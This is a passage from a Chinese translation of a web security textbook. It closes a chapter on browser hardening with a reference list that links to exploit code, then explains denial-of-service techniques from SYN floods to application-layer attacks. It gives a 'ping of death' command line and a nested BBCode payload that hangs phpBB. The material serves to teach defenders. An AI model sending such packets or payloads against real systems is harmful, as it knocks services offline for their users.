保护模式（Protected Mode IE，PMIE，之前称为 Low-Rights IE，LRIE）是 IE 7 的一个特性，利用 Windows Vista 的 “用户账户控制”（User Account Control，UAC）框架来限制 IE 的默认权限（UAC 以前被称为最低权限用户账号，Least-Privilege User Account，LUA）。PMIE 使用 UAC 的强制完整性控制（Mandatory Integrity Control，MIC）功能，这样不能写到更高的完整对象中。也就是意味着 PMIE 只能为指定用户写到临时 Internet 文件（Temporary Internet Files，TIF）和 Cookie 文件夹中，不能写入到其他文件夹（比如 % userprofile% 或 %systemroot%）、敏感的注册表位置（比如 HKEY Local Machine 或 HKEY Current User）、甚至其他更高完整性的进程中。因此，PMIS 提供了一个很好的访问不受信任资源的沙箱。在 Vista 的默认设置中，PMIE 被设置成浏览 Internet、受限制的和本地电脑区域中的站点。在写这本书的时候，Microsoft 还没有计划把 PMIE 移植到 Vista 之前的 Windows 版本中，比如 XP SP2，因为它需要 Vista 的 UAC 框架。

#### 10.3.4 服务端的对抗措施

最后同样也是重要的，Web应用程序开发者和管理员不应忘记他们应该帮助客户端提升安全的职责。就像我们从这本书中看到的，Web攻击越来越多地瞄准位于服务器上的、更直接影响客户端的漏洞。这些方面有一些不错的例子，包括在第6章和第12章中讨论过的跨站脚本（cross-site scripting，XSS）和HTTP响应头截断（HTTP Response Splitting），应该使用在第6章和第12章中讨论的服务端输入验证技术。

站点也应该给它们的用户提供清晰而简单的访问策略和培训资源，以对抗诸如网络钓鱼之类的社会工程攻击。我们也非常推荐技术上强制贯彻这些策略（我们在第 4 章讨论了一些服务端认证技术，比如 CAPTCHA 和 Passmark，可以用来减轻网络钓鱼攻击的危害）。

最后，Web 应用开发者和管理员应该仔细考虑从用户处所收集信息的类型。现在，“拥有客户关系”变成了一种趋势，这导致了一种营销策略的泛滥：收集和存储尽量多的关于在线客户的信息。一种特别有害的做法是，使用个人可标识信息（Personally Identifiable Information，PII）来作为“秘密”保护在线身份（在这个 Google 的时代，你认为这些信息究竟还有多“秘密”可言）。当然，生意还是要做的，但在我们的顾问经验中，我们发现不是所有的这些信息对销售业绩都真正的有用（市场人员需要的只是年龄，性别和邮编信息）。而且如果因为一个安全漏洞泄漏了这些信息，就会成为严重的商务责任。如果你根本没有收集敏感数据，那么你就不用负担保护它的重任。

### 10.4 小结

我们希望现在你已经相信，你的 Web 浏览器确实是不速之客直接进入你的家和办公室的高效入口。遵循我们提出的“加固 Internet 安全体验的十大步骤”，这样的话，在你浏览网站时可以稍微放宽心了。

### 10.5 参考和进一步阅读

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>参考</td><td style='text-align: center; word-wrap: break-word;'>链接</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>安全通报和公告</td><td style='text-align: center; word-wrap: break-word;'>http://www.microsoft.com/athome/security/protect/windowsxp/updates.aspx</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>eWeek的“浏览器安全”主题页面</td><td style='text-align: center; word-wrap: break-word;'>http://www.eweek.com/category2/0,1874,1744082,00.asp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>IE公告</td><td style='text-align: center; word-wrap: break-word;'>http://www.microsoft.com/technet/security/current.aspx</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Firefox公告</td><td style='text-align: center; word-wrap: break-word;'>http://www.mozilla.org/security/announce/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>IE IFRAME漏洞</td><td style='text-align: center; word-wrap: break-word;'>MS04-040</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>“审查存在整数操纵漏洞的代码”</td><td style='text-align: center; word-wrap: break-word;'>http://msdn.microsoft.com/library/en-us/dncode/html/secure04102003.asp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MS04-028在JPEG（GDI+）中的缓冲区溢出</td><td style='text-align: center; word-wrap: break-word;'>http://www.microsoft.com/technet/security/Bulletin/MS04-028.aspx</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Chris Evans的文章：“libPNG 1.2.5基于栈的缓冲区溢出和其他代码问题”</td><td style='text-align: center; word-wrap: break-word;'>http://scary.beasts.org/security/CESA-2004-001.txt</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MS04-025，包括BMP和GIF图像处理中的漏洞</td><td style='text-align: center; word-wrap: break-word;'>http://www.microsoft.com/technet/security/bulletin/MS04-025.aspx</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MS06-001，WMF漏洞</td><td style='text-align: center; word-wrap: break-word;'>http://www.microsoft.com/technet/security/bulletin/MS06-001.aspx</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Firefox IDN URL域名缓冲区溢出</td><td style='text-align: center; word-wrap: break-word;'>https://addons.mozilla.org/messages/307259.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MS04-013 MHTML/CHM 补丁</td><td style='text-align: center; word-wrap: break-word;'>http://www.microsoft.com/technet/security/bulletin/MS04-013.aspx</td></tr></table>

US-CERT 对 HTML Help ActiveX 控件

跨域漏洞的警告

Mozilla 用户界面的欺骗漏洞（XUL）

http://www.us-cert.gov/cas/techalerts/TA05-012B.html

http://secunia.com/advisories/12188/

浏览器利用代码

Michal Zalewski 的文章：“Web 浏览器——一个小闹剧”

浏览器安全检查

Sun Java 插件任意包访问漏洞

Java Web 启动参数注入漏洞

Darkeagle 的 IE createTextRange 攻击

Berend-Jan Wever 的 IE IFRAME 攻击

代码

2006 年 2 月发现的多个 Firefox 漏洞，

Firefox QueryInterface 代码执行

WMF 漏洞利用代码（MetaSploit）

微软 JPEG/GDI+漏洞利用代码

http://www.securityfocus.com/archive/1/

378632/2004-10-15/2004-10-21/0

http://bcheck.scanit.be/bcheck/

IE MHTML/CHM 漏洞

http://jouko.iki.fi/adv/javaplugin.html

libPNG 漏洞利用代码

Thor Larholm 对 http-equiv 的使用拖拽绕过 LMZ 的描述

“Google 桌面大曝光：

http://jouko.iki.fi/adv/ws.html

http://metasploit.com/projects/Framework/

exploits.html#ie_xp_pfv_metafile

http://metasploit.com/archive/framework/

msg00857.html

http://www.milw0rm.com/exploits/1606

http://securityfocus.com/bid/11173/exploit/

http://secunia.com/advisories/18700/

攻击一个 IE 漏洞来获取用户信息 “http://www.edup.tudelft.nl/~bjwever/ exploits/InternetExploiter.zip,

http://www.securityfocus.com/bid/10857/ exploit/

http://www.securityfocus.com/archive/1/354447

http://archives.neohapsis.com/archives/

fulldisclosure/2004-10/0754.html

Georgi Guninski 的 showHelp CHM 文件攻击代码

IE 不恰当的 URI 规范

http://www.hacker.co.il/security/ie/css_import.html

http://www.guninski.com/chm3.html

FFsniFF, 一个窃取 HTML 提交表单的

Firefox 插件

http://securityfocus.com/bid/9182/

http://azurit.gigahosting.cz/ffsniff/

Samy 对 MySpace 蠕虫的技术解释

http://namb.la/popular/tech.html

#### 对抗措施

软件限制策略（SRP）

绕过 SRP

如何在 IE 中加强本地电脑区域的安全

设置

UrlActions

IE 浏览器管理工具包（IEAK）

IE 的安全强化机制（ESC）

欺骗：钓鱼、广告软件和间谍软件

反钓鱼工作小组

JunkBusters

SpywareInfo

Spyware Guide

计算机协会（CA）间谍软件信息中心

免费的间谍软件扫描器

“Windows Defender 是如何识别间谍软件的”

自启动扩展点（ASEP）

http://www.microsoft.com/technet/prodtechnol/winxppro/maintain/rstrplcy.mspx

浏览器帮助对象（BHO）

http://www.sysinternals.com/blog/2005/12/

circumventing-group-policy-as-limited.html

浏览器帮助对象（BHO），简短的总结

僵尸网络研究和发现

广告软件

Windows Defender

http://support.microsoft.com/?kbid=833633

Windows Defender 与其他微软反间谍

http://msdn.microsoft.com/library/default.asp?

url=/workshop/security/szone/reference/

constants/urlaction.asp.

http://www.microsoft.com/windows/ieak/

techinfo/default.mspx

http://www.microsoft.com/

windowsserver2003/developers/ iesecconfig.mspx

http://anti-phishing.org/

http://www.junkbusters.com

http://www.spywareinfo.com

http://www.spywareguide.com

http://www.pestpatrol.com/pestinfo

http://pestpatrol.com/

http://www.microsoft.com/athome/security/spyware/software/msft/analysis.mspx

http://www.pestpatrol.com/PestInfo/

AutoStartingPests.asp

http://msdn.microsoft.com/library/en-us/dnwebgen/html/bho.asp

http://www.spywareinfo.com/articles/bho/

http://www.safer-networking.org

http://www.lavasoft.de

http://www.microsoft.com/athome/security/

spyware/software/default.mspx

http://www.microsoft.com/athome/security/

软件和反病毒技术的比较

spyware/software/about/

productcomparisons.mspx

##### 有关欺骗的网上资源

AWPG 的 “给顾客的建议：如何避免 http://anti-phishing.org/consumer_recs.html 钓鱼诡计”

Internet 犯罪投诉中心（由 FBI 和 http://www.ic3.gov/NW3C 负责）

美国个人隐私权利组织（Privacy Rights Clearing House）“身份欺骗资源”

美国联邦贸易委员会（FTC）关于身份 http://www.consumer.gov/idtheft/

欺骗的站点

##### 通用参考

通用参考

Java 安全 FAQ

Java 标准

IE 的 Internet 安全管理器对象

http://java.sun.com/sfaq/index.html

http://java.sun.com

压缩的 HTML 帮助文件（CHM）

http://msdn.microsoft.com/workshop/

security/szone/reference/objects/

internetsecuritymanager.asp

“跨站大餐”，作者：Michal Zalewski

http://en.wikipedia.org/wiki/Microsoft_Compressed_HTML_Help

“JavaScript: 我们是如何实现的”，作者：Steve Champeon  

http://www.securityfocus.com/archive/107/  

423375/30/0/threaded

showHelp 方法

http://www.oreillynet.com/pub/a/javascript/

2001/04/06/js_history.html

Mozilla 的组件安全

http://msdn.microsoft.com/workshop/author/dhtml/reference/methods/showhelp.asp

如何使用微软产品以明文的形式阅读

E-mail 消息

如何使用 IE 安全区域

http://www.mozilla.org/projects/security/

components/design.html

http://www.microsoft.com/athome/security/

online/browsing_safety.mspx#3

http://support.microsoft.com/?kbid=174360

http://support.microsoft.com/?kbid=240797

## 第 11 章 拒绝服务（Denial of Service）攻击

你到达数据中心时，里面的服务器依然运行着 Web 应用程序，接着你开始检查网络设备。以前交换机和路由器的指示灯总是忽明忽暗地闪个不停，现在却一直亮着。于是你尝试着访问网站，尽管服务器近在咫尺，但是访问速度非常慢，浏览器总是停留在空白页面上。终于，你意识到，世界各地的用户在访问你的网站时，都在经历着蜗牛一般的速度——令人恐怖的超时。恭喜，你正在遭受一次拒绝服务（Denial of Service，DoS）攻击。

拒绝服务攻击，可能只是一群小孩在捣乱，也可能是某些人想趁机敲诈一笔，比方说心怀不满的用户和前任雇员。拒绝服务攻击和通常的攻击不一样，比如，跨站脚本（Cross Site Scripting）的攻击对象是网站的其他用户，SQL注入（SQL Injection）攻击对象是应用程序本身，而拒绝服务攻击则是以干扰甚至中断网站的运营为目的。最终，用户将无法访问网站，随之而来的是直接的经济损失、糟糕的公众形象和用户信赖度的流失。

分布式拒绝服务攻击（Distributed Denial of Service, DDoS）是最流行的拒绝服务攻击，在最近的五年里，由于层出不穷的软件安全漏洞，以及普通用户对计算机安全知识缺乏了解，黑客能够很容易地入侵大量计算机，并把受害的计算机加入“僵尸”（bot）机的网络，导致这类攻击呈持续上升的趋势。令电子商务的投资者们更担心的是，有趋势表明，DDoS 越来越多地针对个人网站特定的应用程序逻辑。

本章首先将介绍历史上一些传统的拒绝服务技术，然后主要讨论针对特定的应用程序的攻击，因为这类攻击越来越普遍。最后，我们将探讨对抗措施，用以防范这种在因特网生活中日益常见的攻击。

### 11.1 常见的 DoS 攻击技术

攻击者在随着计算机技术和防范技术的发展而改变他们的策略，拒绝服务攻击也在与时俱进。在早期的万维网（World Wide Web）时期，当时大量用户开始接入因特网，日渐

泛滥的拒绝服务攻击都是攻击现成（off-the-shelf，OTS）软件（我们对这个词在此的定义包括免费软件、开源软件和商业软件）的漏洞。现成软件的漏洞是软件或网络协议中的实际 Bug（也叫做特征，feature），攻击者可以加以利用。现在，大部分的操作系统上的网络栈（Network stack）相关的漏洞都已经被修复，网络协议相关的问题也有了防范或替代方案。因此攻击者需要探索新的领域以实施拒绝服务攻击。

现在因特网上的攻击通常是通过大量的请求以攫取有限的资源，最终耗尽网站的响应能力。这些攻击利用了因特网基础架构上的一个事实——如果因特网上的每个客户端都同时访问，没有哪个网站和服务器集群能够处理如此规模的流量。

#### 11.1.1 传统的 DoS 攻击：利用漏洞

早期 DoS 攻击的思路，基本上都是利用网络栈上的问题，网络栈指的是操作系统中处理网络流量的代码。网络栈中每一层处理网络流量的不同层次。操作系统的协议栈的开发者总是期望系统在交互中会严格遵循协议的规范，而 DoS 攻击则利用了这一点。一旦对网络流量将如何产生做出了过于理想的假设，大量漏洞就出现了，程序员总是期望数据和处理业务流程是一成不变的，然而攻击者则善于利用各种不同的方法。下面是一些传统的漏洞，可能偶尔还会有效，不过大多数都已经被现代操作系统修补了。

- 超长的网络数据包 这是早期 DoS 攻击的一种。最常见的形式是 “ping of death” 攻击，即在一台安装 Windows 系统的机器上输入命令：ping -l 65510 192.168.2.3（192.168.2.3 是受害机器的 IP 地址）。另外一个例子是 jolt.c，这是一个简单的 C 程序。在一些操作系统上，使用 ping 命令无法产生超长的数据包，jolt.c 可以实现这样的功能。“ping of death” 的主要目的是产生长度超过 65535 字节（byte）的数据包，在 20 世纪 90 年代末期，这可以导致某些操作系统崩溃。

o 碎片重叠（Fragmentation Overlap）通过迫使操作系统处理重复的 TCP/IP 包的分片，来导致操作系统崩溃和资源紧张。已经公布的攻击代码包括 teardrop.c，bonk.c，boink.c，nestea.c 等。

- 自身引用的数据包循环 这种方式是在 TCP/IP 的数据包中, 把源地址和目的地址都设为受害机器的的 IP 地址。公布的攻击代码包括 Land.c 和 LaTierra.c。

Nukers 这类攻击和一个早期的 Windows 漏洞有关系。这个漏洞是向系统发送 OOB（out-of-band）数据包，而导致系统崩溃。这样的攻击，在聊天和游戏的网络世界里很流行，因为它可以让冒犯你的人暂时消失。

极端碎片（Extreme Fragmentation） TCP/IP 本来就是支持由发送端把数据包分片的。通过设置成最大的分片位移，目标计算机或者网络设备（受害者）将需要处理

大量的计算工作以重组数据包。jolt2.c 攻击就是通过发送一组相同的数据包的分片而实施的。

- 组合工具包 不同的目标有不同的攻击方式，为了节省用来判断的时间，一些黑客把各种已知的 DoS 攻击的漏洞利用代码捆绑在一起，用以简单地实施攻击，很多组合工具实际上都利用了上文提及的一些攻击代码，如 jolt，LaTierra，teardrop。我们曾经使用过 targa 和 datapool 这样的组合工具，非常有效（自然是针对已授权的目标）。

正如在本章介绍中提及的那样，到目前为止，即使不是全部的漏洞，也有很多这种类型的漏洞已经被打上了补丁。暂时来说，这些类型的拒绝服务攻击，并不是目前很严重的威胁。遗憾的是，在下一节中，我们将看到，邪恶的黑客们已经转向更具杀伤力的 DoS 攻击。

注意 在 http://www.antiserver.it/Denial-Of-Service/上可以找到更多类似的工具。

#### 11.1.2 现代 DoS 攻击：能力损耗

操作系统的设计者变得越来越聪明，而因特网上的协议经过更充分的测试，变得更加标准，所以黑客在网络栈方面，已经越来越难找到新的漏洞以及没有修补的系统。但他们不会放弃从攻击网络和击垮网站中获得乐趣，于是他们调整了攻击目的，不再一味地执着于攻击操作系统使之崩溃，而仅是让网络和服务器工作得异常繁忙。

所有的网站都是为一定的服务能力而设计的，也就是说，硬件、软件和网络接入方式决定了该网站能支持多大的流量。举个例子，某个网站有一台服务器，该服务器支持100个同时的会话，而且它通过T1（1.544 Mbps）接入网络。如果攻击者创建100个会话并连接到服务器，那么正常用户将无法访问该服务器，因此造成了拒绝服务攻击。如果攻击者用1.544 Mbps的随机流量阻塞网络，正常用户的请求将无法到达网站，或者请求会变得非常慢。

虽然很多攻击最终导致的结果几乎相同，但历史上针对网络设备、服务器和现成服务器软件的攻击更普遍，因为攻击者能够以此攻击这些广泛部署的技术和平台，造成巨大的影响。而现在，网络架构越来越强壮，针对于这些方面的攻击变得越来越难，因此针对特定的应用程序的逻辑（比如 Google 的搜索算法）的攻击已经开始趋向狂热，也注定会越来越普遍。

最基本的⼒损耗类型的 DoS 攻击，就是向⽬标发送⼤流量数据，通常是采⽤以下⼿法：如果仅仅是粗暴地发送⼤量数据包，往往会受到发动攻击的机器的⾃⾝性能的限制；于是，⿊客需要找到⽬标的脆弱点，⽐如，通过TCP/IP协议本身的问题，来扩⼤攻击的效应，以造成攻击端和⽬标的资源消耗的不对称。⼀⾔以蔽之，攻击者总是尝试利⽤少量的资源，以引发攻击⽬标消耗⼤量的资源。这⼀节⾥，我们将探讨⼀些⿊客普遍采⽤的扩⼤效应的“聪明”办法。

##### SYN Floods

SYN flood 是最简单的也是最常见的 DoS 攻击形式。这种攻击发送大量的 SYN 数据包（用以建立 TCP 连接的初始化数据包），发起与远程服务的连接。发送大量 SYN 数据包的目的有两个：第一个就是耗尽被攻击站点的下行带宽。一个以 T1 连接来接入网络的网站，总共有 1.544 Mbps 的带宽。如果该站点接收到的大量的 SYN 数据包就占用了 1.250 Mbps 的带宽，正常的用户将不得不挤着使用剩下的 0.29 Mbps，这自然会非常慢。

第二个目的则是耗尽目标服务器处理连接的能力。这也是扩大DoS攻击影响的“手法”。服务器端通常都会分配一个TCB块（Transmission Control Block），用以保存连接的信息（比如，源地址和目标地址，源端口和目标端口），TCB是一个存储在服务器内存里的结构。而服务器的内存在总是有限的，过多的连接将可能导致耗尽所有可用的内存，或者导致系统为避免耗尽内存而拒绝新的连接，这两种结果都满足攻击者的目标。

在 SYN Flood 攻击中，并不需要接收目标机器回复的数据包，攻击就可以实施，因此 SYN Flood 通常使用伪造或随机生成的 IP 地址，这使得很难追踪到攻击的真正源头。SYN 数据包也是最小的 TCP 数据包，因此仅需消耗攻击端很少的处理时间和内存。而且 SYN 数据包非常常见，是创建 TCP 连接必不可少的一部分，由于每个连接都需要 SYN 数据包来初始化通信，因此，即便是恶意的 SYN 数据包也无法轻易地滤除，除非禁止所有的连接，但是这也就会影响正常的连接。幸运的是，SYN Flood 攻击很容易发现，如果带宽足够，其影响也可以被减弱，或者也可以采用一些技术或产品以过滤掉，在接下来讨论如何防范 DoS 攻击的章节中，我们将提及这些技术和产品。

最早的一次著名的 SYN Flood 攻击是 1996 年针对一家名为 WebCom 的网站托管服务商的攻击。这次攻击发生于 Phrack 和 2600 公布 SYN Flood 攻击技术的相关文章后不久，实际上这次攻击和那一年早些时候针对 Panix.com 的攻击手段如出一辙，那是第一次有记录的 DoS 攻击。在这次攻击里，攻击者入侵并控制了加拿大 British Columbia 地区的 Malaspina 大学的一台计算机，然后以大约每秒钟 200 个速度向服务器发送 SYN 数据包。该公司与其服务提供商都试图追踪这次攻击，因此在大约 40 个小时的时间里，该站点基本无法提供服务。

用以制造 SYN Flood 的攻击工具很多，有一些是独立的工具，比如 juno 和 flood2.c，也有一些工具的组合，比如 Trinoo 和 Stacheldracht。大部分工具使用提供原始套接字的库，以快速地生成数据包，伪造任意的字段，以及用原始套接字来加速攻击。微软采取一些措施以阻止这种攻击，比如在 Windows XP Service Pack 2 中，已经禁止了原始套接字。移除操作系统层次的支持，使得攻击者在已经打过补丁的僵尸机上编写和使用工具变得更困难。

##### UDP Flood

UDP Flood 可以通过许多方式实现。最简单的一种就是，向目标系统的监听 UDP 端口的服务发送大量的 UDP 数据包。发送 UDP 数据包的代价要比发送它的同胞兄弟 TCP 小，有可能仅仅一台计算机发送大量 UDP 数据包，就可以可以击倒其他的计算机或网络。

另外一种 UDP Flood 攻击的机制更能够说明 DoS 攻击中的放大效应。该攻击方式是向一个并没有被监听的端口发送大量的 UDP 数据包。目标服务器将发送 ICMP 差错报文。通过从伪造的地址发送数据包，被攻击的目标服务器将向伪造的地址发送大量的 ICMP 差错报文。如果向许多服务器发送 UDP 数据包，而源 IP 地址是预定的攻击对象，将导致大量的 ICMP 数据包从其他的服务器发送到预定的攻击对象，以最终达到攻击的目的，这是典型的放大效应。

和 SYN Flood 一样，UDP Flood 可以通过伪造数据包，使得很难确定攻击的源头。

##### Smurf 和 Fraggle

Smurf 和 Fraggle 攻击更是充分地利用了放大效应，要么导致大量计算机响应同一个数据包，要么会导致应用程序服务向其他服务器发送大量的数据包。

Smurf 滥用 ICMP 协议，通过中介网络向目标发送大量的数据包。攻击者发送一个含有伪造的源地址（攻击目标）和以中介网络的广播地址为目标地址的 ICMP 消息。当该数据包到达中介网络，所有属于该网络的主机都会向攻击目标发送回复。这意味着一个数据包会引发更多的数据包，也就是放大效应。

Fraggle 利用了两个在大多数的 UNIX 系统上都运行的守护进程：chargen 和 echo。此种攻击向每个守护进程发送初始化的 SYN 数据包，数据包中的地址是伪造的，填入的是对方的地址和源。这会在二者之间建立连接，chargen 将产生大量字符并且通过 echo 返回，这样的循环持续不断。这和本章里的“传统的 DoS 攻击：利用漏洞”一节中提到的自我引用的数据包循环攻击类似，唯一的区别在于，Fraggle 是向其他的计算机发送数据包，而不是同一台计算机。

##### 分布式拒绝服务攻击（DDoS）

DDoS 攻击是最近很流行的基于性能的攻击。它和其他的拒绝服务攻击有一个重要的区别：它的放大效应是通过控制大量的计算机向一个或多个目标发送大量数据包实现的。很多新闻都报道过这一类的攻击。最具有轰动效应的是 2000 年 2 月的 DDoS 攻击，这次攻击导致了亚马逊，buy.com，eBay，E*trade，雅虎和其他一些站点中断服务。很明显，这样的攻击属于最具杀伤性的一类。

DDoS 攻击是如何实现的呢？首先攻击者需要控制因特网上的大量计算机，这可能是

直接的控制，更常见的则是通过病毒和蠕虫一类的恶意程序来控制。这些被控制的计算机运行着如下的一些程序：

☐ 允许远程控制受害机器的程序。

○ 已经预先设定好以实现某种协同攻击的程序（举个例子，2003 年 8 月，冲击波蠕虫就是被预先设定来对微软的网站实施 DoS 攻击的）。

这些被控制的计算机，通常被称之为僵尸（zombie），或者 bot（robot 的缩写，这里指 IRC 中的机器人，IRC 是 Internet Relay Chat 的缩写）。这些僵尸机会自动连接到 IRC 的某个聊天频道并进行注册。恶意的黑客们会加入该聊天频道，并且向僵尸计算机发送命令。通常，黑客们使用多层的主控服务器（它们也被控制，用以控制更多的连接）来控制大量被感染的僵尸机。图 11-1 描述了一种常见的 DDoS 攻击方式，一个攻击者可以控制和协调成千上万的计算机向一个或多个站点发起攻击。

 </div>

众所周知，黑客们利用这些因特网上的所谓的僵尸“军队”来实施 DoS 攻击。甚至有证据显示，在黑客地下团体里，这些僵尸机的资源正在被作为商品来交易。有评估显示，这样的僵尸网络的规模超过了一百万计算机。通过简单的计算，我们可以推断，如此多的僵尸计算机，一旦被控制，将可以击垮因特网上任意站点。DDoS 攻击是一把指向因特网上的上了膛的枪，随时可能击中那些倒霉的在线交易服务商们。

注意 在第 10 章里可以找到关于控制和使用僵尸机软件的更多信息，比如，客户端如何被感染，僵尸软件如何传播。

#### 11.1.3 应用层的 DoS 攻击

针对网络基础架构（如协议）的 DoS 攻击已经变得越来越普遍，因此管理员们也在努力地保护站点，防范相关的攻击。逐渐地，攻击者们也从攻击网络协议转移到了攻击应用程序本身。和基础架构相反——在我们的定义中，基础架构包括常见（不一定是商业的）的现成软件技术，比如站点的网络接入设备，运行 Web 服务器程序的操作系统，Web 服务器程序本身（如果是类似于 IIS 或 Apache 这样的现成软件的话），或者是渐渐在成为现成模块的论坛和 Web 留言本等——我们认为应用层模块是为特定站点和程序定制的任何东西。比如，在我们看来，Google 的搜索引擎是应用层程序。

典型的动态 Web 程序是基于三层架构的：表现层，通常由一些静态的内容（图片和静态网页）组成；中间层，通常是运行业务逻辑和处理动态内容的应用服务器；数据层，由数据库和 LDAP 目录等等组成。处理请求的层次越多，消耗的时间和资源也就越多。一个下载图片的请求只需要 Web 服务器做简单地处理。而动态页面则由于需要程序进行处理和生成结果，比如计算用户提供的数据，则需要更多的 Web 服务器端的资源。最终，如果一个请求需要访问数据库中数据，将使用三个层的资源。很显然，层次越多，资源消耗也就越多，系统能够支持的用户也就越少。举个例子，一个小型的 Web 程序可能能够支持 100 个对于静态资源的同时连接，却可能只能支持 20 个对动态内容的请求或者 10 个需要访问数据库的数据请求。

正如窃贼们会在偷东西之前打探清楚情况，攻击者也会研究应用程序，以找到一些消耗资源较多的页面。这样的页面通常需要很长的加载时间，或需要进行复杂的处理。典型的例子有，基于未索引内容的搜索页面，一些需要从多个数据库表的连接（JOIN）中返回数据的页面（连接是消耗资源较多的一项数据库任务），或者是加密处理。Web应用程序最常见的错误是，即使输入非常长，也同样地进行加密处理。于是攻击者可以提交大量的输入，来迫使应用程序运行大量的复杂的加密运算。

应用程序和攻击者们需要关心的资源包括，处理器、内存、其他的存储设备、共享的资源（数据库连接，文件，登录的用户）或者其他的资源（远程过程调用 RPC，网络端口，线程，会话 ID，等等）。下面将更进一步地探讨，在 DoS 或 DDoS 攻击中，这些资源是如何被消耗的。

处理器 在 Web 程序中，大量的数学运算，数据的加密和解密（特别是公钥加密算法，运算量要比对称加密算法多得多），以及复杂的文本搜索等行为都和处理器的使用紧密相关。

内存 几乎每个针对 Web 应用程序的请求都需要消耗内存。从用户、其他服务和数据

库获得数据而未限制数据的大小，可能引起大量内存的占用，特别容易因此遭受攻击。如今由于虚拟内存的存在，很难出现内存不足的情况，但虚拟内存所带来的性能问题是显著的，服务器很明显地变慢了。

数据库连接 为了改善可扩展性（scalability），大部分的 Web 应用程序都使用了数据库连接池，以实现多个线程共享少量的数据库连接。这样的连接池是由最常见的数据库 API 编写的，比如 ODBC 和 JDBC。访问数据库的请求将占用连接池中有限的数据库连接。那些需要使用复杂的锁和资源处理的事务也很有可能占用这些数据库连接。

多步骤的采购流程和许多网页中随处可见的用户注册就是关于数据库连接的很好的例子。详细的流程往往是这样的，当用户提交第一个页面，Web 程序往数据库添加一行新的数据，接着对该记录加锁，并根据后来的页面请求更新它，直到最后的提交页面，在这个页面中该记录被认为已全部完成，最后释放锁。如果锁的作用范围仅仅是对包含记录的行，其他的事务应当可以同步执行。反之，如果由于复杂的事务，需要对更多的资源加锁，那么将无法同步执行多个事务，甚至导致资源缺乏。如果未通过验证的用户也可以触发这些事务，攻击者们将很容易利用这点，以限制诸如账户失效等响应选项。

用户登录 一些应用程序拥有自己的登录模块并且支持锁定用户，这类应用程序很容易遭受发起的暴力枚举用户名的攻击，由于它们支持锁定用户的功能，因此在多次不成功的登录请求后，最终会导致大量的用户被锁定。同样的威胁还可能在很多情况下出现，比如有些公司使用极容易猜测的命名模式，或是公开公司的通讯录（也可能是某个心怀不满的公司雇员故意泄密的）。如果程序使用的是第三方的验证系统，比如 RADIUS，TACACS+等，大量的暴力登录尝试将阻塞这些验证系统，正常的用户将无法登录。在很多 Web 应用程序里，创建新的账号可能非常容易，如果攻击者暴力式地不停地创建大量用户，那些新用户们就很难完成注册。这会占用数据库或用以保存账号信息的存储结构的空间，如果超过这些空间的大小，可能导致无法再创建新的用户。

注意 在后面的章节里将会谈及如何防范以上各种类型的攻击。

既然我们已经知道一些实现 DoS 攻击的途径，下面来看几个具体的例子。

#### Google 2004 年 7 月的 DDoS 攻击漏洞

流行度：3
简单度：3
影响度：6
风险度：4

关于应用层 DDoS 攻击的一个很好的例子，就是 2004 年 7 月的 Google MailToDoS 攻击。MyDoom-O 蠕虫利用 Google 等搜索引擎，通过向搜索引擎提交对 E-mail 地址的查询进行传播。该蠕虫向所有查找到的 E-mail 地址发送蠕虫的程序，以此进行传播。随着蠕虫的扩散，越来越多的对 E-mail 地址的查询将让服务越来越慢，最终造成了 DoS 攻击。这个蠕虫并没有针对搜索引擎的内部机制进行攻击，不过已经有攻击者在研究 Google 这样的搜索引擎或者类似复杂度的三层架构的程序。他们发现提交一个查询到返回结果通常需要 x 毫秒，而不常见和复杂的查询可能往往需要 2x 毫秒，而提交一个非常复杂的查询则可能需要 4x 毫秒。

考虑以上的因素，如果对大量的查询做响应时间的图形化表示，会产生图 11-2 这样的三波峰的分布曲线。以典型的三层架构的 Web 应用程序来分析结果，攻击者可以假设系统在到达最终数据层前使用了两层索引（实际上是缓存）。明白了这一点，攻击者就知道一次能绕过所有索引的查询比击中第一层索引的查询占据的资源更多。索引是用来限制那些要求使用全部资源的“深度”查询的数目的。相反，常见的查询如“布兰妮·斯皮尔斯”，可能会击中第一层索引并立即提供结果。

 </div>

攻击者们关注于寻找到一种方法，使得他们可以强制所有的查询都可以绕过前两层索引，从而占据最多的资源。如果他们找到了一种的简单方法，使得所有的查询都可以绕过前两层索引，他们就可以发送一系列这样的查询（如果第三层对计算非常敏感，那可能只需要几个），并且阻止应用程序对这些查询进行响应。

#### phpBB DoS 攻击漏洞

流行度：3
简单度：3
影响度：6
风险度：4

针对复杂的大规模 Web 应用程序的 DoS 攻击也有一些例子，我们下面看看 phpBB。phpBB 是一个很流行的开源 BBS 程序，它可以运行在不同的数据库平台上（MySQL，PostgreSQL 和 Access/ODBC）。随着 phpBB 的流行，攻击者和安全测试人员已经找到了针对于该论坛程序的大量的 DoS 攻击漏洞。

2002 年，BBS 的 BBCode 功能被发现存在一个安全漏洞。BBCode 是一种简单的标记语言（HTML 的缩减版），它可以帮助用户更方便地编排帖子的格式，而不用允许用户无限制地使用 HTML。安全测试人员发现嵌套的标记会导致程序出错。

攻击者可以提交，

[code]\0\0[/code]
functions.php 会处理这样的输入，将其扩展为
[1code]\0\0[/code1][1code]\0\0[/code1]

代码标记中的“/0”越多，处理后在每组标记之间将会有更多的[1code][/code1]和更多的“/0”。为了造成对 CPU 的高占用率，攻击者可以提交如下的输入：

[code] \0 [code] \0 [code] \0 [/code] \0 [/code] \0 [/code]

将 “/0” 嵌套在原来的标记之间，这些标记将被递归式地扩展，最终是无限的循环。这个 bug 将会破坏数据库，数据库将无法写入新的数据，而且会导致程序逻辑中无限循环，内存被耗尽，CPU 的占用率达到 100%。如果遭受到这样的攻击，为了恢复使用 Web 应用程序，必须重新启动 Web 服务器的服务进程，以从错误状态中恢复，而且还要修复数据库。

